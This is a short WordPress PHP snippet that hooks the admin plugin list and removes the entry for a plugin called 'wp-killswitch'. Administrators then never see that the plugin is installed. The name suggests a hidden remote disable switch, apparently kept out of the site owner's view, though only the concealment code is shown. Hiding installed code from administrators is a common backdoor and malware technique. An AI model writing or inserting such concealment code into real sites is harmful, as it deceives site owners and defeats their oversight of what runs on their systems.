<?php
function wp_killswitch_hide_plugin() {
    global $wp_list_table;
    $hidearr = array('wp-killswitch/wp-killswitch.php');
    $myplugins = $wp_list_table->items;
    foreach ($myplugins as $key => $val) {
        if (in_array($key,$hidearr)) {
            unset($wp_list_table->items[$key]);
        }
    }
}

add_action('pre_current_active_plugins', 'wp_killswitch_hide_plugin');
